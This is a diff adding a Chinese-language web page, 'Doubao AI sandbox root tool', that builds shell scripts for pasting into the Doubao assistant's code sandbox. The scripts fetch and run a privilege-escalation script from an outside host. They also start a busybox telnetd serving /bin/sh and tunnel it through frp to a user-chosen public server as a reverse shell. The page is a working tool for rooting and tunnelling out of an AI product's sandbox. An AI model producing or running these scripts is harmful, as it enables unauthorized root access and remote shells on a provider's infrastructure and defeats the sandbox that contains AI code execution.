@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>豆包AI沙盒root工具</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background-color: #f8f9fa;
+      min-height: 100vh; min-height: 100dvh;
+      -webkit-font-smoothing: antialiased;
+    }
+    body.no-scroll { overflow: hidden; }
+    .container {
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      min-height: 100vh; min-height: 100dvh; padding: 24px; position: relative;
+    }
+    .avatar {
+      width: 72px; height: 72px; border-radius: 50%; margin-bottom: 20px;
+      object-fit: cover; box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+    }
+    h1 {
+      font-size: 1.6rem; font-weight: 500; color: #1e293b; margin-bottom: 32px;
+      letter-spacing: -0.3px; text-align: center;
+    }
+    #top-hint {
+      position: fixed; top: 12px; left: 50%; transform: translateX(-50%);
+      font-size: 0.8rem; color: #94a3b8; font-weight: 400; z-index: 1000;
+      pointer-events: none; opacity: 0; transition: opacity 0.3s; white-space: nowrap;
+    }
+    #top-hint.visible { opacity: 1; }
+
+    button {
+      background-color: #fff; border: 1px solid #e2e8f0; color: #334155;
+      font-size: 0.95rem; border-radius: 8px; cursor: pointer; min-width: 260px;
+      height: 42px; margin: 6px 0; position: relative; overflow: hidden;
+      -webkit-tap-highlight-color: transparent; outline: none;
+      transition: height 0.7s cubic-bezier(0.33,1,0.68,1),
+                  width 0.7s cubic-bezier(0.33,1,0.68,1),
+                  border-radius 0.7s cubic-bezier(0.33,1,0.68,1),
+                  top 0.7s cubic-bezier(0.33,1,0.68,1),
+                  left 0.7s cubic-bezier(0.33,1,0.68,1);
+      will-change: height, width, border-radius, top, left;
+    }
+    button:focus-visible { outline: 2px solid #94a3b8; outline-offset: 2px; }
+    button:active:not(.expanded) { background-color: #f1f5f9; }
+    button .btn-text {
+      position: absolute; left: 50%; top: 50%; transform: translate(-50%,-50%);
+      white-space: nowrap;
+      transition: top 0.7s cubic-bezier(0.33,1,0.68,1),
+                  transform 0.7s cubic-bezier(0.33,1,0.68,1),
+                  font-size 0.7s ease;
+      pointer-events: none;
+    }
+
+    .panel-content {
+      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+      padding: 20px; padding-top: 50px; opacity: 0;
+      transition: opacity 0.3s ease 0.35s; pointer-events: none; overflow-y: auto;
+    }
+    .panel-content.visible { opacity: 1; pointer-events: auto; }
+
+    .inner-btn, .input-like {
+      min-width: 200px; width: 100%; max-width: 280px; margin: 8px 0;
+      background-color: #fff; border: 1px solid #cbd5e1; color: #1e293b;
+      font-weight: 500; height: 42px; border-radius: 8px; font-size: 0.95rem;
+      cursor: pointer; display: flex; align-items: center; justify-content: center;
+      text-align: center; -webkit-tap-highlight-color: transparent; outline: none;
+    }
+    .inner-btn:active { background-color: #f1f5f9; }
+    .input-like {
+      cursor: text; -webkit-appearance: none; padding: 0 16px; text-align: center;
+    }
+    .input-like:focus { border-color: #94a3b8; box-shadow: 0 0 0 3px rgba(148,163,184,0.12); }
+    .input-like::placeholder { color: #94a3b8; font-weight: 400; font-size: 0.9rem; }
+
+    .back-btn {
+      min-width: 200px; max-width: 280px; width: 100%; margin: 8px 0;
+      background: transparent; border: 1px solid #cbd5e1; color: #64748b;
+      font-weight: 500; height: 42px; border-radius: 8px; font-size: 0.9rem;
+      cursor: pointer; display: flex; align-items: center; justify-content: center;
+    }
+    .back-btn:active { background: rgba(0,0,0,0.03); }
+
+    .script-box { width: 100%; max-width: 280px; margin: 10px 0; text-align: left; position: relative; }
+    .script-title { font-size: 0.9rem; font-weight: 600; color: #1e293b; margin-bottom: 4px; }
+    .code-block {
+      background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 8px; padding: 12px;
+      font-family: 'Courier New', monospace; font-size: 0.8rem; line-height: 1.5;
+      white-space: pre-wrap; word-break: break-all; max-height: 4.5em; overflow-y: auto;
+      color: #1e293b;
+    }
+    .copy-btn {
+      position: absolute; top: 4px; right: 4px; background: rgba(255,255,255,0.9);
+      border: 1px solid #e2e8f0; border-radius: 3px; font-size: 0.65rem; color: #64748b;
+      cursor: pointer; padding: 0 6px; line-height: 1.6; z-index: 2;
+      backdrop-filter: blur(2px); min-width: auto; width: auto; height: auto;
+      margin: 0; overflow: visible; display: inline-block;
+    }
+    .copy-btn:active { background-color: #f1f5f9; }
+    .result-label { font-size: 1.1rem; color: #1e293b; font-weight: 500; margin-bottom: 8px; text-align: center; }
+    .info-text { font-size: 0.8rem; color: #94a3b8; margin-bottom: 20px; text-align: center; line-height: 1.5; }
+  </style>
+</head>
+<body>
+  <div id="top-hint">点击空白处返回</div>
+  <div class="container" id="container">
+    <img class="avatar" src="https://lf-flow-web-cdn.doubao.com/obj/flow-doubao/doubao/web/doubao_avatar.png" alt="豆包头像" id="avatar">
+    <h1 id="title">豆包AI沙盒root工具</h1>
+    <button id="btnFast"><span class="btn-text">我正在使用快速/专家模式</span></button>
+    <button id="btnOffice"><span class="btn-text">我正在使用办公模式</span></button>
+  </div>
+
+  <script>
+    (function() {
+      const BASE_URL = 'https://doubao-root-shell.pages.dev';
+      const URLS = {
+        frps: `${BASE_URL}/frps`, frpc: `${BASE_URL}/frpc`, busybox: `${BASE_URL}/busybox`,
+        rootOld: `${BASE_URL}/root-old.sh`, rootNew: `${BASE_URL}/root-new.sh`
+      };
+      const TELNET_PORT = 1234;
+      function buildScript(c) { return c.join('\n'); }
+      function dl(u,p) { return `(curl -fsSL "${u}" -o "${p}" || wget -O "${p}" "${u}")`; }
+      function wf(p,c) { const d='E'+Math.random().toString(36).slice(2); return `cat > "${p}" << '${d}'\n${c}\n${d}`; }
+      function nh(c,l) { return `nohup ${c} > "${l}" 2>&1 &`; }
+      function genFrps(po) { return buildScript(['#!/bin/sh',dl(URLS.frps,'/tmp/frps'),'chmod +x /tmp/frps',wf('/tmp/frps.toml',`bindPort = ${po}`),nh('/tmp/frps -c /tmp/frps.toml','/tmp/frps.log'),'exit 0']); }
+      function genRoot(m) { const u=m==='expert'?URLS.rootOld:URLS.rootNew; return buildScript(['#!/bin/sh',dl(u,'/tmp/root.sh'),'chmod +x /tmp/root.sh','/tmp/root.sh','exit 0']); }
+      function genFrpc(ip,fp,fpc) { return buildScript(['#!/bin/sh',dl(URLS.frpc,'/tmp/frpc'),dl(URLS.busybox,'/tmp/busybox'),'chmod +x /tmp/frpc /tmp/busybox',nh(`/tmp/busybox telnetd -p ${TELNET_PORT} -l /bin/sh`,'/tmp/telnetd.log'),wf('/tmp/frpc.toml',`serverAddr = "${ip}"\nserverPort = ${fp}\n\n[[proxies]]\nname = "shell"\ntype = "tcp"\nlocalIP = "127.0.0.1"\nlocalPort = ${TELNET_PORT}\nremotePort = ${fpc}`),nh('/tmp/frpc -c /tmp/frpc.toml','/tmp/frpc.log'),'exit 0']); }
+      function generateScripts(o) { if(o.appOnly) return [{title:'提权脚本',code:genRoot(o.mode)}]; return [{title:'服务端 frps 脚本',code:genFrps(o.frpsPort)},{title:'提权脚本',code:genRoot(o.mode)},{title:'反弹 Shell 脚本',code:genFrpc(o.serverIP,o.frpsPort,o.frpcPort)}]; }
+
+      const panelStack = [];
+      let isAnimating = false, safetyId = null, currentMode = 'fast';
+      const btnFast = document.getElementById('btnFast'), btnOffice = document.getElementById('btnOffice'), topHint = document.getElementById('top-hint');
+      const TRANS = 'height 0.7s cubic-bezier(0.33,1,0.68,1), width 0.7s cubic-bezier(0.33,1,0.68,1), border-radius 0.7s cubic-bezier(0.33,1,0.68,1), top 0.7s cubic-bezier(0.33,1,0.68,1), left 0.7s cubic-bezier(0.33,1,0.68,1)';
+      const TEXT_TRANS = 'top 0.7s cubic-bezier(0.33,1,0.68,1), transform 0.7s cubic-bezier(0.33,1,0.68,1), font-size 0.7s ease';
+
+      function updateHint() { topHint.classList.toggle('visible', panelStack.length > 0); }
+      function lockScroll(v) { document.body.classList.toggle('no-scroll', v); }
+      function clearSafety() { if(safetyId) { clearTimeout(safetyId); safetyId = null; } }
+      function getW() { return window.innerWidth - 32; }
+
+      function mkPlaceholder(r) { const d=document.createElement('div'); d.style.cssText=`width:${r.width}px;height:${r.height}px;margin:6px 0;visibility:hidden;flex-shrink:0;pointer-events:none;`; return d; }
+
+      function forceParentExpand(parent) {
+        if(!parent || !parent.classList.contains('expanded')) return;
+        const w = getW();
+        const topVal = '5vh';
+        const leftVal = '16px';
+        const widthVal = w + 'px';
+        const heightVal = '79vh';
+        parent.style.transition = 'none';
+        parent.style.top = topVal; parent.style.left = leftVal;
+        parent.style.width = widthVal; parent.style.height = heightVal;
+        parent.style.borderRadius = '16px';
+        parent._expandedTop = topVal; parent._expandedLeft = leftVal;
+        parent._expandedWidth = widthVal; parent._expandedHeight = heightVal;
+        const sp = parent.querySelector('.btn-text');
+        if(sp) { sp.style.transition = 'none'; sp.style.top = '0'; sp.style.transform = 'translate(-50%,0)'; sp.style.paddingTop = '20px'; sp.style.fontSize = '1.1rem'; sp.style.color = '#1e293b'; }
+        void parent.offsetHeight;
+        parent.style.transition = TRANS;
+        if(sp) sp.style.transition = TEXT_TRANS;
+      }
+
+      function cleanupBtn(btn) {
+        if(!btn) return;
+        const cont=btn.querySelector('.panel-content'); if(cont) cont.remove();
+        const ph=btn._placeholder; if(ph&&ph.parentNode) ph.parentNode.removeChild(ph);
+        btn._placeholder=null; btn._originalRect=null; btn.classList.remove('expanded');
+        btn.style.position=''; btn.style.top=''; btn.style.left=''; btn.style.right='';
+        btn.style.width=''; btn.style.height=''; btn.style.margin=''; btn.style.zIndex='';
+        btn.style.borderRadius=''; btn.style.cursor=''; btn.style.transition='';
+        btn.style.backgroundColor=''; btn.style.borderColor=''; btn.style.maxWidth='';
+        const sp=btn.querySelector('.btn-text');
+        if(sp) { sp.style.top=''; sp.style.transform=''; sp.style.paddingTop=''; sp.style.fontSize=''; sp.style.color=''; sp.style.transition=''; if(btn._originalText) sp.textContent=btn._originalText; }
+        delete btn._cancelAnim; delete btn._animId;
+        delete btn._expandedTop; delete btn._expandedLeft; delete btn._expandedWidth; delete btn._expandedHeight;
+      }
+
+      let globalAnimId = 0;
+
+      function expandBtn(btn, title, renderFn) {
+        if(btn.classList.contains('expanded')) return;
+        if(isAnimating) { const top=panelStack[panelStack.length-1]; if(top) { top.style.transition='none'; void top.offsetHeight; } isAnimating=false; clearSafety(); }
+        const parent=panelStack.length>0?panelStack[panelStack.length-1]:null;
+        if(parent) forceParentExpand(parent);
+        const orig=btn.getBoundingClientRect();
+        btn._originalRect={ top:orig.top, left:orig.left, width:orig.width, height:orig.height };
+        const place=mkPlaceholder(orig);
+        btn.parentNode.insertBefore(place,btn); btn._placeholder=place;
+        btn.style.position='fixed'; btn.style.top=orig.top+'px'; btn.style.left=orig.left+'px';
+        btn.style.width=orig.width+'px'; btn.style.height=orig.height+'px'; btn.style.margin='0';
+        btn.style.zIndex=20+panelStack.length; btn.style.backgroundColor='#fff'; btn.style.borderColor='#e2e8f0';
+        btn.style.borderRadius='8px'; btn.style.maxWidth='none'; btn.classList.add('expanded');
+        delete btn._cancelAnim; const myAnimId = ++globalAnimId; btn._animId = myAnimId;
+        const sp=btn.querySelector('.btn-text');
+        if(sp) { btn._originalText=sp.textContent; sp.textContent=title||sp.textContent; sp.style.transition='none'; sp.style.top='50%'; sp.style.transform='translate(-50%,-50%)'; sp.style.paddingTop='0'; sp.style.fontSize=''; sp.style.color=''; }
+        btn.style.transition = 'none'; void btn.offsetHeight;
+        btn.style.transition = TRANS; if(sp) sp.style.transition = TEXT_TRANS;
+        requestAnimationFrame(() => {
+          if(btn._cancelAnim || btn._animId !== myAnimId) return;
+          if(parent && parent._expandedLeft) {
+            btn.style.top = parent._expandedTop; btn.style.left = parent._expandedLeft;
+            btn.style.width = parent._expandedWidth; btn.style.height = parent._expandedHeight;
+          } else {
+            const w = getW();
+            btn.style.top = '5vh'; btn.style.left = '16px'; btn.style.width = w + 'px'; btn.style.height = '79vh';
+          }
+          btn.style.borderRadius='16px'; btn.style.cursor='default';
+          if(sp && !btn._cancelAnim && btn._animId===myAnimId) { sp.style.top='0'; sp.style.transform='translate(-50%,0)'; sp.style.paddingTop='20px'; sp.style.fontSize='1.1rem'; sp.style.color='#1e293b'; }
+          if(btn._cancelAnim || btn._animId !== myAnimId) return;
+          let cont=btn.querySelector('.panel-content');
+          if(!cont) { cont=document.createElement('div'); cont.className='panel-content'; btn.appendChild(cont); }
+          cont.innerHTML=''; if(typeof renderFn==='function') renderFn(cont,btn); else cont.innerHTML=renderFn;
+          panelStack.push(btn); updateHint(); isAnimating=false;
+          setTimeout(() => { if(cont.parentNode===btn && !btn._cancelAnim && btn._animId===myAnimId) cont.classList.add('visible'); },420);
+          clearSafety(); safetyId=setTimeout(() => {},900);
+        });
+        isAnimating=true;
+      }
+
+      function closeTopPanel(animated=true) {
+        if(panelStack.length===0) return;
+        const btn=panelStack[panelStack.length-1];
+        const origRect=btn._originalRect;
+        if(!origRect) { cleanupBtn(btn); panelStack.pop(); updateHint(); if(panelStack.length===0) lockScroll(false); return; }
+
+        btn._cancelAnim = true; if(btn._animId) btn._animId = null;
+        if(isAnimating) { btn.style.transition='none'; const sp=btn.querySelector('.btn-text'); if(sp) sp.style.transition='none'; void btn.offsetHeight; isAnimating=false; clearSafety(); }
+        clearSafety();
+        if(!animated) { cleanupBtn(btn); panelStack.pop(); updateHint(); return; }
+
+        isAnimating=true;
+
+        const curRect=btn.getBoundingClientRect();
+        const curStyle=window.getComputedStyle(btn);
+        btn.style.transition='none';
+        btn.style.top=curRect.top+'px'; btn.style.left=curRect.left+'px';
+        btn.style.width=curRect.width+'px'; btn.style.height=curRect.height+'px';
+        btn.style.borderRadius=curStyle.borderRadius; btn.style.boxShadow=curStyle.boxShadow;
+        btn.style.backgroundColor=curStyle.backgroundColor; btn.style.borderColor=curStyle.borderColor;
+        btn.style.cursor='default';
+
+        const sp=btn.querySelector('.btn-text');
+        if(sp) { sp.style.transition='none'; const spStyle=window.getComputedStyle(sp); sp.style.top=spStyle.top; sp.style.transform=spStyle.transform; sp.style.paddingTop=spStyle.paddingTop; sp.style.fontSize=spStyle.fontSize; sp.style.color=spStyle.color; if(btn._originalText) sp.textContent=btn._originalText; }
+
+        const cont=btn.querySelector('.panel-content'); if(cont) cont.classList.remove('visible');
+        void btn.offsetHeight;
+
+        btn.style.transition = TRANS; if(sp) sp.style.transition = TEXT_TRANS;
+
+        requestAnimationFrame(() => {
+          btn.style.top = origRect.top + 'px';
+          btn.style.left = origRect.left + 'px';
+          btn.style.width = origRect.width + 'px';
+          btn.style.height = origRect.height + 'px';
+          btn.style.borderRadius = '8px';
+          btn.style.cursor = 'pointer';
+          btn.style.boxShadow = '0 0 0 transparent';
+          btn.style.backgroundColor = '#fff';
+          btn.style.borderColor = '#cbd5e1';
+          // 关键修复：保留 maxWidth 为 none，避免被 CSS 的 max-width 限制导致宽度瞬间跳变
+          btn.style.maxWidth = 'none';
+          if(sp) {
+            sp.style.top='50%'; sp.style.transform='translate(-50%,-50%)'; sp.style.paddingTop='0';
+            sp.style.fontSize=''; sp.style.color='';
+          }
+          const onEnd=(e)=>{
+            if(e.target===btn&&e.propertyName==='height') {
+              btn.removeEventListener('transitionend',onEnd);
+              cleanupBtn(btn); panelStack.pop(); updateHint(); isAnimating=false;
+              if(panelStack.length===0) lockScroll(false);
+            }
+          };
+          btn.addEventListener('transitionend',onEnd);
+          safetyId=setTimeout(()=>{
+            btn.removeEventListener('transitionend',onEnd);
+            if(panelStack[panelStack.length-1]===btn) { cleanupBtn(btn); panelStack.pop(); updateHint(); isAnimating=false; }
+          },900);
+        });
+      }
+
+      function attachCopy(cont) {
+        cont.querySelectorAll('.copy-btn').forEach(b=>b.addEventListener('click',e=>{
+          e.stopPropagation();
+          const code=decodeURIComponent(b.getAttribute('data-code')||'');
+          navigator.clipboard.writeText(code).then(()=>{b.textContent='已复制';setTimeout(()=>b.textContent='复制',1500);})
+          .catch(()=>{const t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;opacity:0';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);b.textContent='已复制';setTimeout(()=>b.textContent='复制',1500);});
+        }));
+      }
+
+      function escapeHtml(t) { const d=document.createElement('div'); d.textContent=t; return d.innerHTML; }
+
+      function renderAppResult(cont) {
+        const mode=currentMode==='fast'?'expert':'office';
+        const s=generateScripts({mode,appOnly:true});
+        let h='<div class="result-label">APP 内使用 · 提权脚本</div>';
+        s.forEach(x=>h+=`<div class="script-box"><div class="script-title">${x.title}</div><button class="copy-btn" data-code="${encodeURIComponent(x.code)}">复制</button><pre class="code-block">${escapeHtml(x.code)}</pre></div>`);
+        h+='<button class="back-btn">← 返回选择</button>'; cont.innerHTML=h; attachCopy(cont);
+        cont.querySelector('.back-btn').addEventListener('click',e=>{e.stopPropagation();closeTopPanel(true);});
+      }
+
+      function renderShellResult(cont) {
+        const sh=panelStack[1]?._shellData||{ip:'未填写',frpsPort:'未填写',frpcPort:'未填写'};
+        const mode=currentMode==='fast'?'expert':'office';
+        const s=generateScripts({mode,appOnly:false,serverIP:sh.ip,frpsPort:sh.frpsPort,frpcPort:sh.frpcPort});
+        let h='<div class="result-label">反弹 Shell · 配置完成</div>';
+        s.forEach(x=>h+=`<div class="script-box"><div class="script-title">${x.title}</div><button class="copy-btn" data-code="${encodeURIComponent(x.code)}">复制</button><pre class="code-block">${escapeHtml(x.code)}</pre></div>`);
+        h+='<button class="back-btn">← 返回选择</button>'; cont.innerHTML=h; attachCopy(cont);
+        cont.querySelector('.back-btn').addEventListener('click',e=>{e.stopPropagation();closeTopPanel(true);});
+      }
+
+      function selectMode(mode) {
+        if(isAnimating) return;
+        const active=mode==='fast'?btnFast:btnOffice;
+        if(panelStack.length>0&&panelStack[0]===active) return;
+        while(panelStack.length>0) { const b=panelStack.pop(); cleanupBtn(b); }
+        updateHint(); currentMode=mode; lockScroll(true);
+        expandBtn(active, active.querySelector('.btn-text').textContent, (cont)=>{
+          const btnA=document.createElement('button'); btnA.className='inner-btn';
+          btnA.innerHTML='<span class="btn-text">我只想在豆包APP内使用</span>';
+          btnA.addEventListener('click',e=>{e.stopPropagation();expandBtn(btnA,'APP 内使用',renderAppResult);});
+          const btnS=document.createElement('button'); btnS.className='inner-btn';
+          btnS.innerHTML='<span class="btn-text">我还想要反弹shell</span>';
+          btnS.addEventListener('click',e=>{
+            e.stopPropagation();
+            expandBtn(btnS,'反弹shell · 公网IP',(div,shellBtn)=>{
+              const d={ip:'',frpsPort:'',frpcPort:''}; shellBtn._shellData=d;
+              div.innerHTML=`<input type="text" class="input-like" placeholder="填写你的公网服务器IP"><button class="inner-btn confirm-next"><span class="btn-text">确认</span></button>`;
+              const inp=div.querySelector('input');
+              div.querySelector('.confirm-next').addEventListener('click',e=>{
+                e.stopPropagation(); const ip=inp.value.trim();
+                if(!ip){ inp.style.borderColor='#ef4444'; setTimeout(()=>inp.style.borderColor='#cbd5e1',800); return; }
+                d.ip=ip;
+                expandBtn(div.querySelector('.confirm-next'),'填写frps端口',(d2)=>{
+                  d2.innerHTML=`<input type="number" class="input-like" placeholder="填写要用于访问公网服务器frps服务的端口"><button class="inner-btn confirm-next"><span class="btn-text">确认</span></button>`;
+                  const inp2=d2.querySelector('input');
+                  d2.querySelector('.confirm-next').addEventListener('click',e=>{
+                    e.stopPropagation(); const p=inp2.value.trim();
+                    if(!p){ inp2.style.borderColor='#ef4444'; setTimeout(()=>inp2.style.borderColor='#cbd5e1',800); return; }
+                    d.frpsPort=p;
+                    expandBtn(d2.querySelector('.confirm-next'),'填写frpc端口',(d3)=>{
+                      d3.innerHTML=`<input type="number" class="input-like" placeholder="填写要用于访问沙盒frpc服务的端口"><button class="inner-btn confirm-next"><span class="btn-text">确认</span></button>`;
+                      const inp3=d3.querySelector('input');
+                      d3.querySelector('.confirm-next').addEventListener('click',e=>{
+                        e.stopPropagation(); const p3=inp3.value.trim();
+                        if(!p3){ inp3.style.borderColor='#ef4444'; setTimeout(()=>inp3.style.borderColor='#cbd5e1',800); return; }
+                        d.frpcPort=p3;
+                        expandBtn(d3.querySelector('.confirm-next'),'配置结果',renderShellResult);
+                      });
+                    });
+                  });
+                });
+              });
+            });
+          });
+          cont.appendChild(btnA); cont.appendChild(btnS);
+        });
+      }
+
+      btnFast.addEventListener('click', e => { e.stopPropagation(); if(panelStack.length>1) closeTopPanel(true); else selectMode('fast'); });
+      btnOffice.addEventListener('click', e => { e.stopPropagation(); if(panelStack.length>1) closeTopPanel(true); else selectMode('office'); });
+
+      document.addEventListener('click', e => {
+        if(panelStack.length===0) return;
+        if(e.target.closest('.copy-btn')) return;
+        const top=panelStack[panelStack.length-1];
+        if(!top.contains(e.target)) closeTopPanel(true);
+      });
+
+      window.addEventListener('keydown', e => { if(e.key==='Escape'&&panelStack.length>0) closeTopPanel(true); });
+
+      window.addEventListener('resize', () => {
+        if(isAnimating) return;
+        const w=getW();
+        for(let i=0;i<panelStack.length;i++) {
+          const b=panelStack[i]; if(!b) continue;
+          b.style.transition='none';
+          if(i===0) { b.style.top='5vh'; b.style.left='16px'; b.style.width=w+'px'; b.style.height='79vh'; }
+          else { const p=panelStack[i-1]; if(p._expandedLeft) { b.style.top=p._expandedTop; b.style.left=p._expandedLeft; b.style.width=p._expandedWidth; b.style.height=p._expandedHeight; } else { const pr=p.getBoundingClientRect(); b.style.top=pr.top+'px'; b.style.left=pr.left+'px'; b.style.width=pr.width+'px'; b.style.height=pr.height+'px'; } }
+          void b.offsetHeight; b.style.transition=TRANS;
+        }
+      });
+
+      window.addEventListener('beforeunload', () => { while(panelStack.length) cleanupBtn(panelStack.pop()); updateHint(); lockScroll(false); });
+    })();
+  </script>
+</body>
+</html>
